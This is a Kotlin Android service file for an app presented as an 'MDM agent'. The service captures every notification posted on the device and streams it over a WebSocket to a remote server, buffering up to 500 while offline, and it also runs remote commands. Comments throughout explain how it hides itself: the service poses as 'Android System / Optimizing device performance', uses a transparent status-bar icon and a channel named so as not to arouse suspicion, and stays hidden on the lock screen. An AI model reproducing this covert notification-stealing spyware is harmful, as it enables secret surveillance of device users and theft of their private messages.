package com.company.mdmagent.core

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.company.mdmagent.R
import com.company.mdmagent.collectors.HeartbeatCollector
import com.company.mdmagent.collectors.NotificationListener
import com.company.mdmagent.commands.CommandDispatcher
import com.company.mdmagent.network.ApiClient
import com.company.mdmagent.network.AgentHelloMessage
import com.company.mdmagent.network.AgentHelloPayload
import com.company.mdmagent.network.CommandResultMessage
import com.company.mdmagent.network.CommandResultPayload
import com.company.mdmagent.network.IncomingMessage
import com.company.mdmagent.network.MessageHandler
import com.company.mdmagent.network.NotificationEventMessage
import com.company.mdmagent.network.NotificationEventPayload
import com.company.mdmagent.network.NotificationItem
import com.company.mdmagent.network.WebSocketManager
import com.company.mdmagent.utils.AgentPreferences
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.time.Instant
import java.util.ArrayDeque
import java.util.UUID

/**
 * AgentService – الخدمة الرئيسية للـ MDM Agent
 * تعمل كـ Foreground Service لضمان الاستمرارية
 */
class AgentService : Service() {

    companion object {
        private const val TAG = "AgentService"
        private const val CHANNEL_ID = "mdm_sys_v2"   // v2 → قناة جديدة بـ IMPORTANCE_NONE
        private const val NOTIFICATION_ID = 1001

        // الحد الأقصى للإشعارات المخزّنة في الـ offline buffer (لتجنب استهلاك الذاكرة)
        private const val MAX_OFFLINE_BUFFER = 500

        fun start(context: Context) {
            val intent = Intent(context, AgentService::class.java)
            context.startForegroundService(intent)
        }

        fun stop(context: Context) {
            val intent = Intent(context, AgentService::class.java)
            context.stopService(intent)
        }
    }

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)

    private lateinit var webSocketManager: WebSocketManager
    private lateinit var heartbeatCollector: HeartbeatCollector
    private lateinit var commandDispatcher: CommandDispatcher
    private lateinit var messageHandler: MessageHandler

    // bufer الإشعارات الفورية (تتراكم حتى تُرسل دفعة واحدة)
    private val notificationBuffer = mutableListOf<NotificationItem>()

    // bufer الإشعارات offline – تُحفظ هنا عند انقطاع الاتصال وتُرسل فور الاتصال
    private val offlineNotificationQueue = ArrayDeque<NotificationItem>()

    private var agentStartTime = System.currentTimeMillis()

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "AgentService created")
        agentStartTime = System.currentTimeMillis()
        AgentPreferences.saveAgentStartTime(this, agentStartTime)

        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildForegroundNotification())

        initializeComponents()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "onStartCommand called")

        scope.launch {
            ensureRegistered()
        }

        return START_STICKY // يُعيد تشغيل الخدمة تلقائياً إذا أُوقفت
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        Log.w(TAG, "AgentService destroyed – will restart via START_STICKY")
        heartbeatCollector.stop()
        webSocketManager.disconnect()
        job.cancel()
    }

    // ---- Initialization ----

    private fun initializeComponents() {
        commandDispatcher = CommandDispatcher(
            context = this,
            scope = scope,
            onResult = { result -> sendCommandResult(result) }
        )

        webSocketManager = WebSocketManager(
            context = this,
            scope = scope,
            onMessageReceived = { message -> handleMessage(message) },
            onConnected = { onWebSocketConnected() },
            onDisconnected = { Log.w(TAG, "WebSocket disconnected") }
        )

        heartbeatCollector = HeartbeatCollector(
            context = this,
            scope = scope,
            webSocketManager = webSocketManager
        )

        messageHandler = MessageHandler(
            context = this,
            webSocketManager = webSocketManager,
            commandDispatcher = commandDispatcher,
            onHelloAck = { onHelloAckReceived() }
        )

        // ربط NotificationListener – يُستدعى في كل مرة يأتي فيها إشعار جديد
        NotificationListener.onNotificationPostedCallback = { notif ->
            synchronized(notificationBuffer) {
                notificationBuffer.add(notif)
                // إرسال فوري (batch size = 1) – غيّره إلى رقم أكبر إن أردت دمجها
                val batch = notificationBuffer.toList()
                notificationBuffer.clear()
                sendOrQueueNotifications(batch)
            }
        }
    }

    // ---- Registration ----

    private suspend fun ensureRegistered() {
        if (!AgentPreferences.isRegistered(this)) {
            Log.i(TAG, "Device not registered. Starting registration...")
            try {
                val response = ApiClient.registerDevice(this)
                AgentPreferences.saveRegistration(
                    context = this,
                    deviceUid = response.deviceUid,
                    authToken = response.authToken,
                    wsUrl = response.wsUrl,
                    heartbeatInterval = response.heartbeatIntervalSeconds
                )
                Log.i(TAG, "Registration successful: ${response.deviceUid}")
            } catch (e: Exception) {
                Log.e(TAG, "Registration failed: ${e.message}. Will retry...")
                // WorkManager سيعيد المحاولة عند الاتصال التالي
                return
            }
        }

        Log.i(TAG, "Device registered. Connecting WebSocket...")
        webSocketManager.connect()
    }

    // ---- WebSocket Events ----

    private fun onWebSocketConnected() {
        Log.i(TAG, "WebSocket connected. Sending hello...")

        val deviceUid = AgentPreferences.getDeviceUid(this) ?: return
        val authToken = AgentPreferences.getAuthToken(this) ?: return

        val hello = AgentHelloMessage(
            msgId = UUID.randomUUID().toString(),
            timestamp = Instant.now().toString(),
            payload = AgentHelloPayload(
                deviceUid = deviceUid,
                authToken = authToken,
                agentVersion = "1.0.0"
            )
        )
        webSocketManager.send(hello)

        // بدء الـ Heartbeat
        val interval = AgentPreferences.getHeartbeatInterval(this)
        heartbeatCollector.start(interval)

        // ملاحظة: لا نُرسل الـ offline queue هنا لأن الـ Server لم يُصادق علينا بعد.
        // الإرسال يحدث في onHelloAckReceived() بعد استلام agent_hello_ack.
    }

    /**
     * يُستدعى من MessageHandler عند استلام agent_hello_ack (أي Server صادق على الاتصال).
     * هنا نضمن أن السيرفر يعرف هوية الجهاز قبل إرسال الإشعارات.
     */
    fun onHelloAckReceived() {
        flushOfflineNotificationQueue()
    }

    private fun handleMessage(message: IncomingMessage) {
        messageHandler.handle(message)
    }

    // ---- Command Results ----

    private fun sendCommandResult(result: CommandResultPayload) {
        val message = CommandResultMessage(
            msgId = UUID.randomUUID().toString(),
            timestamp = Instant.now().toString(),
            payload = result
        )
        webSocketManager.send(message)
    }

    // ---- Notification Sending (with offline fallback) ----

    /**
     * يحاول إرسال الإشعارات مباشرة عبر WebSocket.
     * إذا كان الاتصال منقطعاً، يضعها في الـ offline queue لإرسالها لاحقاً.
     */
    private fun sendOrQueueNotifications(notifications: List<NotificationItem>) {
        if (notifications.isEmpty()) return
        val deviceUid = AgentPreferences.getDeviceUid(this) ?: run {
            // الجهاز لم يُسجَّل بعد، نحفظها مؤقتاً
            synchronized(offlineNotificationQueue) {
                notifications.forEach { addToOfflineQueue(it) }
            }
            return
        }

        val message = NotificationEventMessage(
            msgId = UUID.randomUUID().toString(),
            timestamp = Instant.now().toString(),
            payload = NotificationEventPayload(
                deviceUid = deviceUid,
                notifications = notifications
            )
        )

        val sent = webSocketManager.send(message)
        if (sent) {
            Log.d(TAG, "✅ Sent ${notifications.size} notification(s) to server")
        } else {
            // الاتصال منقطع → احفظ في الـ offline queue
            Log.w(TAG, "📦 WebSocket not connected. Queuing ${notifications.size} notification(s)")
            synchronized(offlineNotificationQueue) {
                notifications.forEach { addToOfflineQueue(it) }
            }
        }
    }

    /**
     * يُضيف إشعاراً للـ offline queue مع احترام الحد الأقصى.
     * يجب استدعاؤه داخل synchronized(offlineNotificationQueue)
     */
    private fun addToOfflineQueue(item: NotificationItem) {
        if (offlineNotificationQueue.size >= MAX_OFFLINE_BUFFER) {
            offlineNotificationQueue.pollFirst() // احذف الأقدم
            Log.w(TAG, "Offline queue full – dropped oldest notification")
        }
        offlineNotificationQueue.addLast(item)
    }

    /**
     * يُرسل كل الإشعارات المخزّنة في الـ offline queue فور إعادة الاتصال.
     * يُستدعى من onWebSocketConnected().
     */
    private fun flushOfflineNotificationQueue() {
        val batch: List<NotificationItem>
        synchronized(offlineNotificationQueue) {
            if (offlineNotificationQueue.isEmpty()) return
            batch = offlineNotificationQueue.toList()
            offlineNotificationQueue.clear()
        }

        val deviceUid = AgentPreferences.getDeviceUid(this) ?: return

        Log.i(TAG, "🔄 Flushing ${batch.size} offline notification(s) after reconnect")

        // إرسال على دفعات بحد أقصى 50 لتجنب رسائل WebSocket كبيرة جداً
        batch.chunked(50).forEach { chunk ->
            val message = NotificationEventMessage(
                msgId = UUID.randomUUID().toString(),
                timestamp = Instant.now().toString(),
                payload = NotificationEventPayload(
                    deviceUid = deviceUid,
                    notifications = chunk
                )
            )
            webSocketManager.send(message)
        }
    }

    // ---- Notification Channel ----

    private fun createNotificationChannel() {
        // IMPORTANCE_NONE = لا يظهر في لوحة الإشعارات إطلاقاً (Android 8+)
        // لكن Android يظهره رغم ذلك لـ Foreground Services في بعض الأجهزة
        // لذا نجمع بين IMPORTANCE_NONE + أيقونة شفافة + FOREGROUND_SERVICE_IMMEDIATE
        val channel = NotificationChannel(
            CHANNEL_ID,
            "System",               // اسم بسيط لا يثير الشبهة في الإعدادات
            NotificationManager.IMPORTANCE_NONE  // الأعلى إخفاءً المتاح لـ Foreground Service
        ).apply {
            description = "System background process"
            setShowBadge(false)          // لا تظهر دائرة العدد على أيقونة التطبيق
            enableLights(false)          // لا وميض LED
            enableVibration(false)       // لا اهتزاز
            setSound(null, null)         // لا صوت
            lockscreenVisibility = Notification.VISIBILITY_SECRET  // مخفي في شاشة القفل
        }
        val nm = getSystemService(NotificationManager::class.java)
        nm.createNotificationChannel(channel)
    }

    private fun buildForegroundNotification(): Notification {
        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            // نص غير مثير للشبهة يبدو كخدمة نظام عادية
            .setContentTitle("Android System")
            .setContentText("Optimizing device performance")
            // أيقونة شفافة → تختفي من شريط الحالة العلوي تماماً
            .setSmallIcon(R.drawable.ic_transparent_notification)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // مخفي في شاشة القفل
            .setShowWhen(false)   // لا تُظهر الوقت

        // Android 12+ : FOREGROUND_SERVICE_IMMEDIATE يمنع الإشعار من الظهور
        // في أعلى الشاشة (heads-up) عند بدء الخدمة لمدة 10 ثوانٍ
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            builder.setForegroundServiceBehavior(
                NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE
            )
        }

        return builder.build()
    }
}
